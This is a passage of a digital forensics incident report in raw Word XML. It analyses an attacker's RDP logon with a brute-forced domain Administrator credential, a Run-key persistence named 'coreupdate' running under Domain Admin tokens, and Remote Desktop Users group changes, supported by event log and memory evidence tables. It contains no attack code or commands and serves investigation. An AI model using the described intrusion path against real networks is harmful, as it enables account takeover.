            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>privilege escalation / valid accounts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1078.002, T1021.001, T1547.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:22.980909 → 2020-09-19 05:08:15.224627</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Authentication chain 2020-09-19: 03:36:22.98 4672 + 4624 type 3 Kerberos C137.LOCAL\Administrator from 10.42.85.10, LogonId 0x842184 (NLA pre-auth, #39562/#39563); 03:36:23.01 RemoteConnectionManager 1149 source 10.42.85.10 (#34902); 03:36:24.43 4648 by svchost PID 0x1C0 (TermService) 10.42.85.10:0 (#39575); 4624 type 10 LogonProcess User32, LogonId 0x857E73 (#39576); 4672 SeSecurity/SeTakeOwnership/SeLoadDriver/SeBackup/SeRestore/SeDebug/SeSystemEnvironment/SeImpersonate (#39577); LSM 21/22 session 3 from 10.42.85.10; 4647 logoff 03:52:13.47 (#39812), 4634 type 3 0x842184 at 03:52:13.99 (#39819). Memory (getsids): coreupdater.exe token contains S-1-5-21-2232410529-1445159330-2725690660-500 (Administrator), -512 Domain Admins and -519 Enterprise Admins (GetSIDs.jsonl#619/#632/#634); same for MicrosoftEdge (#600/#613/#615).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ricksanchez at 2020-09-19 05:08:15: 4648 + 4624 type 11 CachedInteractive LogonId 0xB3CE02 (#39825/#39826), 4672 admin privileges (#39828), 4624 type 7 unlock (#39830); processes of ricksanchez in memory (FTK Imager.exe, OneDrive, etc.) carry -1106 and -512 Domain Admins (GetSIDs.jsonl#1164/#1176).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The attacker did not need a local privilege escalation to obtain administrative rights: the stolen domain Administrator credential (brute-forced on the DC, F-018) already gives Domain/Enterprise Admin and SeDebugPrivilege; getsystem (F-009) was only used to obtain a SYSTEM token. The 05:08:15 logon of ricksanchez is a cached (type 11) interactive logon matching the start of the responder acquisition (FTK Imager run under ricksanchez, F-002); it caused HKLM Run 'coreupdate' to execute (F-010/F-019) inside a Domain Admin token, giving the attacker a second session with Domain Admin rights. Type 11 means the DC was not contacted for that logon (network or DC availability), which is consistent with DC being the compromised pivot but is not conclusive.</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03:36:22.980909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137.LOCAL\Administrator | LogonType 3 | LogonId: 0x842184 | AuthenticationPackageName: Kerberos | LogonProcessName: Kerberos | - | - (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</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C137\Administrator | LogonType 10 | LogonId: 0x857E73 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432952</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4672 | Microsoft-Windows-Security-Auditing | Administrative logon | PrivilegeList: SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege | LogonId: 0x857E73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39577</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.468385</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4647 | Microsoft-Windows-Security-Auditing | User initiated logoff | LogonId: 0x857E73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39812</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</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"Administrator", "PID": "8324", "Process": "coreupdater.ex", "SID": "S-1-5-21-2232410529-1445159330-2725690660-500"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#619</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"Domain Admins", "PID": "8324", "Process": "coreupdater.ex", "SID": "S-1-5-21-2232410529-1445159330-2725690660-512"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#632</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_getsids</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Name": "Enterprise Admins", "PID": "8324", "Process": "coreupdater.ex", "SID": "S-1-5-21-2232410529-1445159330-2725690660-519"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#634</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.224593</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C137\ricksanchez | LogonType 11 | LogonId: 0xB3CE02 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39826</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.224627</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4672 | Microsoft-Windows-Security-Auditing | Administrative logon | PrivilegeList: SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege | LogonId: 0xB3CE02</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39828</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_getsids</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Name": "Domain Admins", "PID": "6544", "Process": "FTK Imager.exe", "SID": "S-1-5-21-2232410529-1445159330-2725690660-512"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#1176</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-022: Remote Desktop Users group populated by C137\ricksanchez (Domain Administrator, Domain Admins, Domain Users, mortysmith) — enabled the later RDP path</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(recmd kroll)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-terminalservices-remoteconnectionmanager%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>privilege / configuration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1098, T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:49.588649 → 2020-09-19 03:36:23.009739</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Security 4732 at 2020-09-18 22:55:33.99–22:55:34.00 (#38829-#38832), target Builtin\Remote Desktop Users (S-1-5-32-555), SubjectUserSid S-1-5-21-2232410529-1445159330-2725690660-1106 (C137\ricksanchez), SubjectLogonId 0x438E75 = ricksanchez interactive logon type 2 of 22:52:49 (4624 #38782, LSM session 3). Members added: -500 (C137\Administrator), -512 (Domain Admins), -513 (Domain Users), -1108 (mortysmith). Registry: HKLM\SYSTEM\ControlSet001\Control\Terminal Server fDenyTSConnections=0 (key LastWrite 2020-09-19 03:17:00.95, recmd_kroll_F.csv#7138), RDP-Tcp UserAuthentication=1 (NLA). First RDP listener connection 261 at 03:35:54, 1149 from 10.42.85.10 at 03:36:23 (#34902).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>This change occurs ~4.5 h before the first attacker activity (RDP scan of DC ≈03:19 host time) and is performed from a legitimate interactive console session of ricksanchez, so it is most likely administrative configuration by the environment owner, not attacker action (probable interpretation). Nevertheless it is a security weakness: adding Domain Users to Remote Desktop Users allows any domain account to RDP to the workstation, and the attacker's C137\Administrator RDP logon relied on RDP being enabled and authorised. The fDenyTSConnections key LastWrite (03:17:00) coincides with the logoff of the local Admin console session (03:17:00), so RDP may have been (re)enabled by Admin at that moment; the key timestamp alone does not prove which value was written (possible).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (7)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22:55:33.992616</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S-1-5-21-2232410529-1445159330-2725690660-500 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:33.996906</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S-1-5-21-2232410529-1445159330-2725690660-512 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38830</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:33.998901</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S-1-5-21-2232410529-1445159330-2725690660-513 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38831</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:34.000371</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Builtin\Remote Desktop Users (S-1-5-32-555) | SubjectLogonId: 0x438E75 | MemberName: - | MemberSid: S-1-5-21-2232410529-1445159330-2725690660-1108 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38832</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:49.588649</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C137\ricksanchez | LogonType 2 | LogonId: 0x438E75 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:17:00.952531</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
